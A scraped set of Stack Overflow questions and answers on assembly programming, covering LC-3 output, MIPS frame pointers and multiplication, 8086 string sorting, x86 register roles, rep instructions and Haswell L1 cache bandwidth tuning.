<p>To make your program work you will need to add <strong>48 (decimal)</strong> or <strong>x30 (hex)</strong> to your number before you can print it to the console. </p>

<pre><code>.ORIG x3000
  AND R0, R0, #0    ; Clear R0
  LD R0, NUM        ; load our number into R0
  LD R2, ASCII      ; load the ascii offset into R2
  ADD R0, R0, R2    
  OUT
HALT                ; Trap x25

NUM   .fill  x02    ; Our Number to print
ASCII .fill  x30    ; Our ASCII offset
.END
</code></pre>

<hr>

<p>In your example you want to print off an array of characters like 1234. The concept for this is pretty similar but we'll need to work with pointers and a for loop. </p>

<pre><code>.ORIG x3000
  AND R0, R0, #0    ; Clear R0
  AND R1, R1, #0    ; Clear R1
  AND R3, R3, #0    ; Clear R3
  LEA R0, NUM       ; pointer [mem]NUM
  ADD R1, R1, R0    ; Store the pointer address of R0 into R1
  LD R2, ASCII      ; load the ascii offset into R2

FOR_LOOP
  LDR R4, R1, #0    ; load the contents of mem address of R1 into R4
  BRz END_LOOP
  ADD R4, R4, R2    ; Add our number to the ASCII offset
  STR R4, R1, #0    ; Store the new value in R4 into [mem] address R1
  ADD R1, R1, #1    ; move our memory pointer down one
  BRnzp FOR_LOOP    ; loop again until we get an x00 char
END_LOOP

  PUTs              ; print our string starting from [mem]address in R0
HALT                ; Trap x25

ASCII .fill  x30    ; Our ASCII offset
NUM   .fill  x01    ; Our Number to print
      .fill  x02     
      .fill  x03
      .fill  x04
.END
</code></pre>
","33401821"
"Intel X86-64 assembly tutorials or book","6502","","<p>I tried to search about intel x64 assembly tutorials with examples or a good book but I didn't find even in the intel site.</p>

<p>so, Could you suggest me a good tutorials or book for that ??
I'm using nasm on linux.</p>

<p>Thanks</p>
","<p>Admittedly it's personal bias how you <em>prefer</em> to learn about programming.</p>

<p>But with respect to assembly languages in particular, I found an approach which to me has been more useful than reading instruction set reference manuals and/or books on assembly language (where they exist).</p>

<p>What I normally do to figure out how assembly works for a new CPU / a CPU unknown to me on an OS platform I've not worked with yet is to leverage the developer toolchain. Like that:</p>

<ul>
<li><p>install yourself a (cross-)compiler and disassembler for the target CPU. These days, GNU gcc's / binutils ubiquity often mean that's <code>gcc</code> and <code>objdump -d</code>.</p></li>
<li><p>create a bunch of small programs / small pieces of sourcecode, like:</p></li>
</ul>

<pre><code>extern int funcA(int arg);
extern int funcB(int arg1, int arg2);
extern int funcC(int arg1, int arg2, int arg3);
extern int funcD(int arg1, int arg2, int arg3, int arg4);
extern int funcE(int arg1, int arg2, int arg3, int arg4);
extern int funcF(int arg1, int arg2, int arg3, int arg4, int arg5);
extern int funcG(int arg1, int arg2, int arg3, int arg4, int arg5, int arg6);
extern int funcH(int arg1, int arg2, int arg3, int arg4, int arg5, int arg6,
                 int arg7);

int main(int argc, char **argv)
{
    printf(""sum of all funcs: %d\n"",
        funcA(1) + funcB(2, 3) + funcC(4, 5, 6) + funcD(7, 8, 9, 10) +
        funcE(11, 12, 13, 14, 15) + funcF(16, 17, 18, 19, 20, 21) +
        funcG(22, 23, 24, 25, 26, 27, 28) + funcH(29, 30, 31, 32, 33, 34, 35));
    return 12345;
}</code></pre>

<ul>
<li><p>compile these <em>with compiler optimization</em> and disassemble the generated object code.<br>
The structure of the code is simple enough to demonstrate how the <em>ABI</em> behaves wrt. to <em>function calling</em>, <em>passing arguments</em> and <em>returning values</em>, <em>managing the register space</em> wrt. to which registers are preserved / volatile when making function calls. It'll also show you some basic assembly code for initializing constant data, and ""glue"" like stack access and management.</p></li>
<li><p>extend this for simple C language constructs like loops and <code>if</code>/<code>else</code> or <code>switch</code> statements. Always keep some calls to external undefined functions in because doing so will prevent the compiler optimizer from throwing all your ""test code"" out, and when you use <code>if()</code> tests of <code>switch()</code>, predicate on <code>argc</code> (or other function arguments) because the compiler cannot predict that either (and hence optimize the building blocks of the code ""weirdly"").</p></li>
<li><p>extend this for using <code>struct {}</code> and <code>class {}</code> definitions containing sequences of different primitive data types, in order to find out how the compiler arranges these in memory, which assembly instructions are used to access bytes/words/ints/longs/floats etc.<br>
All these pieces of test code you can deliberately vary (like, use different operations than <code>+</code>), and/or make more complex in order to learn more about specific pieces of the instruction set and ABI.</p></li>
</ul>

<p>After you've done that, and looked at the output, locate a copy (electronic or not) of the <em>Platform ABI</em>. That contains the rulebook for how the above is done / why it is done that way, and it'll help you get a feeling for why these rules apply to the specific platform. It's essential to get an idea about the above because when you write your own assembly code, you'll have to interface that with other non-assembly (unless for pure demos). That's where you need to play by the rules, so even if you don't know them by heart, at least know where the rulebook is.</p>

<p>Only after that would I suggest you actually track down the instruction set reference for the specific platform.</p>

<p>That's because when you've gone through the above first, then you already got enough experience / you've already seen enough to  start with a small C program, compile it down to assembly source, modify that a little, assemble and link it and see if your modification does what it's supposed to do.</p>

<p>Attempting to, at that stage, to use some more uncommon / specialized instructions will be much easier because you've already seen how function calling works, what sort of glue code is necessary to interface your assembly with other parts of the program, you've already used the toolchain, so you don't need to start completely from scratch anymore.</p>

<p>I.e., to sum this all up, my suggestion is to learn assembly from <em>the top down</em> instead of <em>from the bottom up</em>.</p>

<p><strong>Side note:</strong></p>

<p>Why am I suggesting to use <em>compiler optimization</em> when analyzing compiler-generated assembly code for such simple examples ?<br>
Well, the answer to that is because, counterintuitively to some, the generated assembly code is <em>much simpler</em> if you let the compiler optimize the hell out of things. Without optimization, compilers often create ""stupid"" code that e.g. puts all variables into the stack, saves and restores them from there for no reason you can see, does register saves/restores/initializations just to overwrite that reg the very next instruction and many more such things. The amount of code emitted is much much larger because of this. It's peppered with cruft and much harder to understand. The compiler optimization forces trimming this cruft down to the essential, which is what you want to see in order to understand the platform ABI, and the assemnbly. Therefore, use compiler optimization.</p>
","15299461"
"Use of Frame Pointer MIPS","6502","","<p>i need to convert my code from stack pointer to only use frame pointer, how can i do so? i am very new to MIPS.</p>

<p>i have this  recursion C code and its MIPS code below. i am using stack pointer , <strong>how can i change it to use frame pointer?</strong></p>

<p>here is my C Code</p>

<pre><code>int fact(int n)
{
    if(n!=1)
     return n*factorial(n-1);
}

    int comb (int n, int k)
    {
    return fact (n) / fact (k) / fact (n - k);
    }
</code></pre>

<blockquote>
  <p>here my MIPS code</p>
</blockquote>

<pre><code>comb:           
 sub $sp, $sp, 16
 sw $ra , 0($sp)
 sw $s0, 4($sp) 
 sw $a0, 8($sp) 
 sw $a1, 12($sp)
 jal fact       
 move $s0, $v0  
 lw $a0, 12($sp) 
 jal fact       
 div $s0, $s0, $v0 
 lw $a0, 8($sp) 
 lw $a1, 12($sp) 
 sub $a0, $a0, $a1 
 jal fact       
 div $s0, $s0, $v0 
 move $v0, $s0  
 lw  $ra, 0($sp) 
 lw  $s0, 4($sp) 
 addi $sp, $sp, 16 
 jr $ra         
</code></pre>
","<p>I found @markgz's comments to be interesting. His link to Wikipedia includes the quote:</p>

<blockquote>
  <p>The frame pointer ($30) is optional and in practice rarely used except when the stack allocation in a function is determined at runtime, for example, by calling alloca().</p>
</blockquote>

<p>I always kinda thoght that <code>$fp</code> seemed superfluous, but I always used it anyway because that's how I was taught to do it.</p>

<p>Anyway, if you are still interested, here is how I used the frame pointer:</p>

<pre><code>#save $ra $s0, $a0 on stack
addi $sp $sp -4
sw   $fp 0($sp)
move $fp $sp
addi $sp $sp -12
sw   $ra  -4($fp)
sw   $a0  -8($fp)
sw   $s0 -12($fp)

...

#restore and shrink stack
lw $s0 -12($fp)
lw $ra  -4($fp)
lw $fp   0($fp)
addi $sp $sp 16

jr $ra
</code></pre>

<p>So each time the stack is expanded, I use the stack-pointer to save the old value of the frame pointer, and then I restore the old value of the frame pointer when shrinking the stack.</p>

<p>Mostly I just copy and paste this code every time I write a new function.</p>
","23123753"
"C++/Assembly IDE on Linux","6487","","<p>What I'm looking for is an IDE that will run on Linux, that has support for C++ and x86 assembly syntax highlighting. I've already tried Code::Blocks, but that won't let me run the program as I need to, so that didn't work well.</p>

<p>My needs:</p>

<ul>
<li>Able to compile programs by issuing a ""make all"" in a certain directory</li>
<li>Able to run programs by issuing a custom command instead of running a certain executable</li>
<li>Graphical (not vim/emacs/etc) and will run in GNOME/Fedora 14</li>
</ul>

<p>What would be very helpful:</p>

<ul>
<li>Git integration</li>
<li>Autoversioning (like Code::Blocks does) </li>
</ul>

<p>Eclipse doesn't work for me, as it no matter what I set it tries to do an auto-build/error check of the entire program, using the wrong toolchain, and errors out everything, even if I disable CDT.</p>

<p>Assembly syntax highlighting is not a <em>requirement</em> but would be useful. It does, however, have to have C++ syntax highlighting.</p>

<p>EDIT: By ""Graphical"" I mean that I already tried vim/emacs some time ago, and found them too challenging to learn how to use in a short amount of time without loosing my sanity.</p>

<p>EDIT 2: The given editor should also store project files in just one file, as I don't want to have to ""git add"" a whole new directory each time the editor silently adds some file there.</p>
","<h3>Vim</h3>

<p>Be sure to look at </p>

<ul>
<li><a href=""http://vim.wikia.com/wiki/VimTip1608"" rel=""nofollow"">C++ Omni Completion</a></li>
<li>ctags and <a href=""http://www.vim.org/scripts/script.php?script_id=273"" rel=""nofollow"">TagList</a>
<ul>
<li>I use <code>ctags --exclude=packagedir -R --c++-kinds=+p --fields=+iaS --extra=+q .</code> </li>
</ul></li>
<li><a href=""http://cscope.sourceforge.net"" rel=""nofollow"">cscope</a> (<a href=""http://vim.wikia.com/wiki/Cscope"" rel=""nofollow"">here</a> and <a href=""http://cscope.sourceforge.net/cscope_vim_tutorial.html"" rel=""nofollow"">here</a>)</li>
</ul>

<p>Simply the best editor and will work anywhere - including in your remote terminal under screen :)</p>

<h3>Eclipse CDT</h3>

<p>Eclipse can import existing makefile projects and will not clobber the makefile :)
Eclipses intellisense is nice</p>

<p>I use Eclipse HELIOS on linux. It supports </p>

<ul>
<li>profiling, </li>
<li>memchecking with valgrind</li>
<li>GDB debugging, remote debugging</li>
<li>call graph visualization, comprehensive symbol XRef (the usual eclipse shortcuts apply), simple refactorings</li>
<li>coverage GCov</li>
<li>oprofile</li>
<li>...</li>
</ul>

<p>It should be portable so I expect most of this to work on windows.</p>
","5697014"
"Difference between `bx` and `bp`?","6481","","<p>What is the difference between <code>bx</code> and <code>bp</code> in assembly? Example here:</p>

<pre><code>mov bx, 1h
mov bp, 1h
</code></pre>

<p>Do they reference to the same memory? Is it the same with <code>ss</code> and <code>sp</code>?</p>
","<p>In <code>x86</code> the registers <code>bx</code> and <code>bp</code> are totally unrelated. The only common thing about them is the word <code>base</code>.</p>

<ul>
<li><code>bx</code> <strong>(base index)</strong> is a general-purpose register (like ax, cx and dx), typically used as a pointer to data (used for arrays and such)</li>
<li><code>bp</code> <strong>(base pointer)</strong> is typically used to point at some place in the stack (for instance holding the address of the current stack frames)</li>
</ul>

<p>Again, <code>ss</code> and <code>sp</code> are different as well.</p>

<ul>
<li><code>ss</code> <strong>(stack segment)</strong> is a segment register (like cs, ds and es). It holds the <a href=""http://en.wikipedia.org/wiki/X86_memory_segmentation"" rel=""noreferrer"">segment</a> used by the stack.</li>
<li><code>sp</code> <strong>(stack pointer)</strong> points at the top of the stack</li>
</ul>
","7279337"
"Multiplying using assembly 8086 in DOSBOX","6473","","<p>I am trying to do a basic multiplication but I keep getting errors and I don't understand why. I know that I have to use ""MUL"". </p>

<p>Here is the code I am working with</p>

<pre><code>POP AX 
MOV AL, [NUMB]
MUL 10H
POP AX
RET
</code></pre>

<p>THE ERROR IS : INVALID COMBINATION OF OPCODE AND OPERANDS    at MUL 10H</p>
","<p>Here is a good example of Unsigned multiplication (MUL operand):</p>

<pre><code>Inputting a 2-digit decimal number

MOV AH, 1       ;read first digit
INT 21H
SUB AL, ‘0’     ; convert digit from ASCII code to binary
MOV BL, 10
MUL BL          ; multiply digit by 10
MOV CL, AL
MOV AH, 1       ; read 2nd digit
INT 21H
SUB AL, ‘0’     ; convert digit from ASCII code to binary
ADD AL, CL      ; AL contains the 2-digit number
</code></pre>

<p>You have to read the documentations as well in order to understand what every instruction means and how it works.
Here is a good site to start learning assembly, has nice examples from every basic instruction
<a href=""http://www.electronics.dit.ie/staff/tscarff/8086_instruction_set/8086_instruction_set.html#MUL"" rel=""nofollow"">Complete 8086 instruction set </a> and <a href=""http://wiki.answers.com/Q/Explain_the_instruction_set_of_8086_with_examples"" rel=""nofollow"">instruction set of 8086 with examples</a></p>
","15976983"
"AND faster than integer modulo operation?","6471","","<p>It is possible to re-express:</p>

<ul>
<li>i % m</li>
</ul>

<p>as: </p>

<ul>
<li>i &amp; (m-1)</li>
</ul>

<p>where,</p>

<ul>
<li>i is an unsigned integer</li>
<li>m is a power of 2</li>
</ul>

<p>My question is: is the AND operation any faster? Don't modern CPUs support integer modulo in hardware in a single instruction? I'm interested in ARM, but don't see the modulo operation in its instruction set.</p>
","<p>It's more complicated than ""single instruction"" these days. Modern CPUs are complex beasts and need their instructions broken down into issue/execute/latency. It also usually depends on the width of the divide/modulo - how many bits are involved.</p>

<p>In any case, I'm not aware of 32 bit being single cycle latency on any core, ARM or not. On ""modern"" ARM there are integer divide instructions, but only on some implementations, and most notably not on the most common ones - Cortex A8 and A9.</p>

<p>In some cases, the compiler can save you the trouble of converting a divide/modulo into bit shift/mask operations. However, this is only possible if the value is <em>known at compile time</em>. In your case, if the compiler can see <em>for sure</em> that 'm' is always a power a two, then it'll optimize it to bit ops, but if it's a variable passed into a function (or otherwise computed), then it can't, and will resort to a full divide/modulo. This kind of code construction often works (but not always - depends how smart your optimizer is):</p>

<pre><code>unsigned page_size_bits = 12;
unsigned foo(unsigned address) {
  unsigned page_size = 1U &lt;&lt; page_size_bits;
  return address / page_size;
}
</code></pre>

<p>The trick is to let the compiler know that the ""page_size"" is a power of two. I know that gcc and variants will special-case this, but I'm not sure about other compilers.</p>

<p>As a rule of thumb for any core - ARM or not (even x86), prefer bit shift/mask to divide/modulo. Even if your core has hardware divide, it'll be faster to do it manually.</p>
","7677687"
"Sorting strings in 8086 Assembly","6471","","<p>I want to write a 8086 assembly program that takes 5 strings from the user as an input and then sorts these strings and prints the sorted result as an output. I actually do everything but I have a big problem with the sorting part. I know how to use a for example bubble sort to sort the items in an array that start from a specific address but here I have 5 different strings that are not in the same array. each string has its own address and its own characters. I try to compare last character of each string with each other and then if one is bigger that another one i swap the whole string and then I go on and do that for the whole characters of all string to the first. </p>

<p>For example if our input strings are:</p>

<pre><code>eab    
abe    
cbd    
cda    
adb
</code></pre>

<p>I will first sort the last character of every string and I come up with this:</p>

<pre><code>cda    
eab    
adb    
cbd    
abe
</code></pre>

<p>Then I will compare them by the middle character:</p>

<pre><code>eab    
cbd    
abe    
cda    
adb
</code></pre>

<p>and at last with the first character and everything is sorted:</p>

<pre><code>abe
adb
cbd
cda    
eab
</code></pre>

<p>but it is actually what in my mind and I don't have any idea who to implement that for my job.</p>

<pre>
; multi-segment executable file template.

data segment 
    data1 db 64,?,64 dup(?)
    data2 db 64,?,64 dup(?)
    data3 db 64,?,64 dup(?)
    data4 db 64,?,64 dup(?)
    data5 db 64,?,64 dup(?)

    change db 66 dup(?)

    msg db 0ah,0dh,""You enter a wrong option"",0ah,0dh,""try again"",0ah,0dh,""$"" 
    prompt db 0ah,0dh,""Choose an option:"",0ah,0dh,""$""
    prompt1 db "".a: Sort in ascending order"",0ah,0dh,""$"" 
    prompt2 db "".d: Sort in descending order"",0ah,0dh,""$""
    prompt3 db "".q: Quit"",0ah,0ah,0dh,""$"" 
    enter db 0ah,0ah,0dh,""Enter 5 strings:"",0ah,0dh,""$""
    pkey db 0ah,0dh,""press any key...$""
ends

stack segment
    dw   128  dup(0)
ends

code segment
main proc far
; set segment registers:
    mov ax, data
    mov ds, ax
    mov es, ax

again:
; printing the prompts for the user
    lea dx, prompt
    mov ah, 09h
    int 21h   

    lea dx, prompt1
    mov ah, 09h
    int 21h

    lea dx, prompt2
    mov ah, 09h
    int 21h

    lea dx, prompt3
    mov ah, 09h
    int 21h   

; getting a character from the user as an input
    mov ah, 01h
    int 21h

; determining which option the user selects    
    cmp al, 'a'
    je ascending
    cmp al, 'd'
    je descending
    cmp al, 'q'
    je quit

; this is for the time that the user enters a wrong char    
    lea dx, msg
    mov ah, 09h
    int 21h
    jmp again     ; again calling the application to start

ascending:
    call input
    call AscendSort
    jmp again     ; again calling the application to start

descending:
    call input
    call DescendSort
    jmp again     ; again calling the application to start

quit:            
    lea dx, pkey
    mov ah, 9
    int 21h        ; output string at ds:dx

    ; wait for any key....    
    mov ah, 1
    int 21h

    mov ax, 4c00h ; exit to operating system.
    int 21h  
main endp
;.................................................
; this subroutine gets input from user
input proc

    lea dx, enter
    mov ah, 09h
    int 21h
    call newline

    mov ah, 0ah
    lea dx, data1
    int 21h      
    call newline

    mov ah, 0ah
    lea dx, data2
    int 21h
    call newline

    mov ah, 0ah
    lea dx, data3
    int 21h
    call newline

    mov ah, 0ah
    lea dx, data4
    int 21h
    call newline

    mov ah, 0ah
    lea dx, data2
    int 21h
    call newline

    ret 
input endp
;................................................
; sorting the strings in the ascending order
AscendSort proc         

    mov si, 65
    lea dx, change
    mov al, data1[si]
    cmp al, data2[si]
    ja l1    
    ?????

    ret
AscendSort endp 
;................................................
; sorting the strings in the descending order
DescendSort proc



    ret
DescendSort endp 
;................................................
; newline
newline proc

    mov ah, 02h
    mov dl, 0ah
    int 21h

    mov dl, 0dh
    int 21h   

    ret        
newline endp    
ends

end main ; set entry point and stop the assembler.
</pre>

<p>Any other algorithm for sorting these whole strings also will be appreciated.</p>
","<p>I actually figure out the answer myself, I use string commands to compare the strings 2 by 2 with each other to see if their bigger, smaller or equal. Something like the code below in the specific macro that takes two strings to checks them and do the required operation like swapping the strings to make them sorted:</p>

<pre><code>check macro a, b
    local next, finish
    cld
    mov cx, 64  ; the size of our buffer that saves the string
    mov si, a
    mov di, b

    repe cmpsb  ; comparing two strings with each other
    ja next
    jmp finish

next:
    ; swaping our strings if needed
    mov cx, 64
    mov si, a
    lea di, change
    rep movsb 

    mov cx, 64
    mov si, b
    mov di, a
    rep movsb

    mov cx, 64
    lea si, change
    mov di, b
    rep movsb 

finish:

endm
</code></pre>
","14676716"
"Performance of x86 rep instructions on modern (pipelined/superscalar) processors","6448","","<p>i've been writing in x86 assembly lately (for fun) and was wondering whether or not rep prefixed string instructions actually have a performance edge on modern processors or if they're just implemented for back-compatibility.</p>

<p>i can understand why Intel would have originally implemented the rep instructions back when processors only ran one instruction at a time, but is there a benefit to using them now?</p>

<p>With a loop that compiles to more instructions, there is more to fill up the pipeline and/or be issued out-of-order.  Are modern processors built to optimize for these rep-prefixed instructions, or are rep instructions used so rarely in modern code that they're not important to the manufacturers?</p>
","<p>There is a lot of space given to questions like this in both AMD and Intel's optimization guides. Validity of advice given in this area has a ""half life"" - different CPU generations behave differently, for example:</p>

<ul>
<li><a href=""http://support.amd.com/us/Processor_TechDocs/25112.PDF"">AMD Software Optimization Guide (Sep/2005)</a>, section 8.3, pg. 167:<br>
<em>Avoid using the REP prefix</em> when performing string operations, especially when copying blocks of memory.</li>
<li><a href=""http://support.amd.com/us/Processor_TechDocs/40546.pdf"">AMD Software Optimization Guide (Apr/2011)</a>, section 9.3, pg. 148:<br>
<em>Use the REP prefix judiciously</em> when performing string operations.</li>
</ul>

<p>The <a href=""http://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-optimization-manual.html"">Intel Architecture Optimization Manual</a> gives performance comparison figures for various block copy techniques (including <code>rep stosd</code>) on <em>Table 7-2. Relative Performance of Memory Copy Routines</em>, pg. 7-37f., for different CPUs, and again what's fastest on one might not be fastest on others.</p>

<p>For many cases, recent x86 CPUs (which have the ""string"" SSE4.2 operations) can do string operations via the SIMD unit, see <a href=""http://www.strchr.com/strcmp_and_strlen_using_sse_4.2"">this investigation</a>.</p>

<p>To follow up on all this (and/or keep yourself updated when things change again, inevitably), read <a href=""http://www.agner.org/optimize/"">Agner Fog's Optimization guides/blogs</a>.</p>
","8429084"
"Change an array's value in x86 assembly (embedded in C++)","6445","","<p>I am messing around with assembly for the first time, and can't seem to change the index values of an array.  Here's the method I am working on</p>

<pre><code>int ascending_sort( char arrayOfLetters[], int arraySize )
 {
   char temp;

__asm
    {

   //???
      }
}
</code></pre>

<p>And these are what I tried</p>

<pre><code>mov temp, 'X'
mov al, temp
mov arrayOfLetters[0], al
</code></pre>

<p>And this gave me an error C2415: improper operand type</p>

<p>so I tried</p>

<pre><code>mov temp, 'X'
mov al, temp
mov BYTE PTR arrayOfLetters[0], al
</code></pre>

<p>This complied, but it didn't change the array...</p>
","<p>The <code>arrayOfLetters</code> value is equivalent to a pointer. So, your assembly code might need to be:</p>

<pre><code>mov temp, 'X' 
mov al, temp 
mov edx, arrayOfLetters
mov [edx], al 
</code></pre>

<p>In the above code, <code>edx</code> is loaded with the address of <code>arrayOfLetters</code>. Then the last instruction stores the <code>al</code> byte into the address pointed to by <code>edx</code>.</p>
","2649691"
"Multiplication using add and shift: translating from Java to MIPS","6441","","<p>I have to write in MIPS a program that multiplies two number using the add and shift method.  After trying many many times, I got somehow a program that I see to should be working, but its not, then I wrote it in Java and the code worked in Java.  Then I tried to convert it from Java to MIPS (usually its easier for me to translate to low level language from a code in high level language), and after translating it, still its not working. Here is the code I wrote, and please if anybody detects anything wrong with them or knows how to fix them please do tell me.</p>

<p>Thanks,</p>

<p>In Java:</p>

<pre><code>static int prod = 0;

public static int mult (int mcand, int mier)
{
    while (mier != 0)
    {
        int rem = mier % 2;

        if (rem != 0)
        {
            prod += mcand;
        }

        mcand = mcand &lt;&lt; 1;
        mier = mier &gt;&gt; 1;
    }

    return prod;
}
</code></pre>

<p>In MIPS:</p>

<pre><code># A program that multiplies two integers using the add and shift method

.data # Data declaration section

.text

main: # Start of code section

    li $s0, 72 # the multiplicand
    li $t0, 72 # the multiplicand in a temporary register
    li $s1, 4 # the multiplier
    li $t1, 4 # the multiplier in a temporary register
    li $s2, 0 # the product
    li $s3, 2 # the number 2 in a register for dividing by 2 always for checking if even or odd

LOOP: # first we check if the multiplier is zero or not

    beq $t1, $zero, END

    div $t1, $s3
    mfhi $t3 # remainder is now in register $t3

    beq $t3, $zero, CONTINUE # if the current digit is 0, then no need to add just go the shifting part

    add $s2, $s2, $t0 # the adding of the multiplicand to the product

CONTINUE: # to do the shifting after either adding or not the multiplicand to the product
    sll $t0, $t0, 1
    srl $t0, $t0, 1

    j LOOP # to jump back to the start of the loop

END:    
    add $a0, $a0, $s2
    li $v0, 1
    syscall

# END OF PROGRAM
</code></pre>

<hr>
","<p>Aside from @Joop Eggen's correction, you have to take into account whether delay branching takes into place or not.
If the MIPS you are using has delay branching you should modify your program accordingly. The simplest way is to add a <code>nop</code> instruction after your jumps/branches (after the two <code>beq</code> and after <code>j</code>).</p>

<p>Besides that, at the end of your code you are adding the result ($s2) to $a0 instead of moving it there.</p>

<p>So, to summarize:</p>

<ul>
<li>take into account delay branching, i.e. add <code>nop</code> after beq's and j</li>
<li>change <code>srl $t0, $t0</code>, 1 to <code>srl $t1, $t1, 1</code></li>
<li>change <code>add $a0, $a0</code>, $s2 to <code>add $a0, $0, $s2</code></li>
</ul>
","8535702"
"What is an assembly-level representation of pushl/popl %esp?","6422","","<p><strong>C++</strong></p>

<p><strong>ATT Assembly</strong></p>

<p>I'm trying to understand the behavior of the following two instructions:</p>

<pre><code>pushl %esp
</code></pre>

<p>And:</p>

<pre><code>popl %esp
</code></pre>

<p>Note that they store the computed value back into <code>%esp</code>.</p>

<p>I'm considering these instructions independently, not in sequence. I know that the value stored in <code>%esp</code> is always the value before the increment/decrement, but how could I represent the behavior in assembly language? This is what I've come up with so far:</p>

<p>For push:</p>

<pre><code>movl %esp, %edx     1. save value of %esp
subl  $4, %esp      2. decrement stack pointer
movl %edx, (%esp)   3. store old value of %esp on top of stack
</code></pre>

<p>For pop:</p>

<pre><code>movl (%esp), %esp   You wouldn’t need the increment portion. 
</code></pre>

<p>Is this correct? If not, where am I going wrong? Thanks.</p>
","<p>As it says about <code>push esp</code> in <a href=""http://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-manual-325462.html"" rel=""noreferrer"">Intel® 64 and IA-32 Architectures Developer's Manual: Combined Volumes</a>:</p>

<pre><code>The PUSH ESP instruction pushes the value of the ESP register as it existed
before the instruction was executed. If a PUSH instruction uses a memory operand
in which the ESP register is used for computing the operand address, the address
of the operand is computed before the ESP register is decremented.
</code></pre>

<p>And as regards to <code>pop esp</code>:</p>

<pre><code>The POP ESP instruction increments the stack pointer (ESP) before data at the old
top of stack is written into the destination.
</code></pre>
","14969137"
"Obtaining peak bandwidth on Haswell in the L1 cache: only getting 62%","6417","","<p>I'm attempting to obtain full bandwidth in the L1 cache for the following function on Intel processors</p>

<pre><code>float triad(float *x, float *y, float *z, const int n) {
    float k = 3.14159f;
    for(int i=0; i&lt;n; i++) {
        z[i] = x[i] + k*y[i];
    }
}
</code></pre>

<p>This is the triad function from <a href=""http://www.cs.virginia.edu/stream/"">STREAM</a>.</p>

<p>I get about 95% of the peak with SandyBridge/IvyBridge processors with this function (using assembly with NASM). However, using Haswell I only achieve 62% of the peak unless I unroll the loop. If I unroll 16 times I get 92%. I don't understand this.</p>

<p>I decided to write my function in assembly using NASM. The main loop in assembly looks like this.</p>

<pre><code>.L2:
    vmovaps         ymm1, [rdi+rax]
    vfmadd231ps     ymm1, ymm2, [rsi+rax]
    vmovaps         [rdx+rax], ymm1
    add             rax, 32
    jne             .L2
</code></pre>

<p>It turns out in <a href=""http://www.agner.org/optimize/"">Agner Fog's Optimizing Assembly manual</a> in examples 12.7-12.11 he does almost the same thing (but for <code>y[i] = y[i] +k*x[i]</code>) for the Pentium M, Core 2, Sandy Bridge, FMA4, and FMA3.  I managed to reproduce his code more or less on my own (actually he has a small bug in the FMA3 example when he broadcasts). He gives instruction size counts, fused ops , execution ports in tables for each processor except for FMA4 and FMA3. I have tried to make this table myself for FMA3.</p>

<pre><code>                                 ports
             size   μops-fused   0   1   2   3   4   5   6   7    
vmovaps      5      1                    ½   ½
vfmadd231ps  6      1            ½   ½   ½   ½
vmovaps      5      1                            1           1
add          4      ½                                    ½
jne          2      ½                                    ½
--------------------------------------------------------------
total       22      4            ½   ½   1   1   1   0   1   1
</code></pre>

<p>Size refers to the instruction length in bytes. The reason the <code>add</code> and <code>jne</code> instructions have half a μop is they get fused into one macro-op (not to be confused with μop fusion which still uses multiple ports) and only need port 6 and one μop.  <s>The <code>vfmadd231ps</code> instruction can use port 0 or port 1. I chose port 0. The load <code>vmovaps</code> can use port 2 or 3. I chose 2 and had <code>vfmadd231ps</code> use port 3.</s>. In order to be consistent with Agner Fog's tables and since I think it makes more sense to say an instruction which can go to different ports equally goes to each one 1/2 of the time, I assigned 1/2 for the ports <code>vmovaps</code> and <code>vmadd231ps</code> can go to.</p>

<p>Based on this table and the fact that all Core2 processors can do four μops every clock cycle it appears this loop should be possible every clock cycle but I have not managed to obtain it. <strong>Can somebody please explain to me why I can't get close to the peak bandwidth for this function on Haswell without unrolling? Is this possible without unrolling and if so how can it be done?</strong> Let me be clear that I'm really trying to maximize the ILP for this function (I don't only want maximum bandwidth) so that's the reason I don't want to unroll.</p>

<p><strong>Edit:</strong>
Here is an update since Iwillnotexist Idonotexist showed using IACA that the stores never use port 7. I managed to break the 66% barrier without unrolling and do this in one clock cycle every iteration without unrolling(theoretically).  Let's first address the store problem.</p>

<p>Stephen Canon mentioned in at comment that the Address Generation Unit (AGU) in port 7 can only handle simple operations such as <code>[base + offset]</code> and not <code>[base + index]</code>. In the <a href=""http://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-optimization-manual.html"">Intel optimization reference manual</a> the only thing I found was a comment on port7 which says ""Simple_AGU"" with no definition of what simple means. But then Iwillnotexist Idonotexist found in the comments of <a href=""https://software.intel.com/en-us/articles/intel-architecture-code-analyzer"">IACA</a> that this problem was already mentioned six months ago in which an employee at Intel wrote on 03/11/2014: </p>

<blockquote>
  <p>Port7 AGU can only work on stores with simple memory address (no index register).</p>
</blockquote>

<p>Stephen Canon suggests ""using the store address as the offset for the load operands."" I have tried this like this </p>

<pre><code>vmovaps         ymm1, [rdi + r9 + 32*i]
vfmadd231ps     ymm1, ymm2, [rsi + r9 + 32*i]
vmovaps         [r9 + 32*i], ymm1
add             r9, 32*unroll
cmp             r9, rcx
jne             .L2
</code></pre>

<p>This indeed causes the store to use port7. However, it has another problem which is that the the <code>vmadd231ps</code> does not fuse with the load which you can see from IACA. It also needs additionally the <code>cmp</code> instruction which my original function did not. So the store uses one less micro-op but the <code>cmp</code> (or rather then <code>add</code> since the <code>cmp</code> macro fuses with the <code>jne</code>) needs one more. IACA reports a block throughput of 1.5. In practice this only get about 57% of the peak. </p>

<p>But I found a way to get the <code>vmadd231ps</code> instruction to fuse with the load as well. This can only be done using static arrays with addressing [absolute 32-bit address + index] like this. <a href=""http://ideone.com/z67F7L"">Evgeny Kluev original suggested this</a>.</p>

<pre><code>vmovaps         ymm1, [src1_end + rax]
vfmadd231ps     ymm1, ymm2, [src2_end + rax]
vmovaps         [dst_end + rax], ymm1
add             rax, 32
jl              .L2
</code></pre>

<p>Where <code>src1_end</code>, <code>src2_end</code>, and <code>dst_end</code> are the end addresses of static arrays.</p>

<p><strong>This reproduces the table in my question with four fused micro-ops that I expected.</strong> If you put this into IACA  it reports a block throughput of 1.0. In theory this should do as well as the SSE and AVX versions. In practice it gets about 72% of the peak. That breaks the 66% barrier but it's still a long ways from the 92% I get unrolling 16 times. So on Haswell the only option to get close to the peak is to unroll. This is not necessary on Core2 through Ivy Bridge but it is on Haswell. </p>

<p><strong>End_edit:</strong></p>

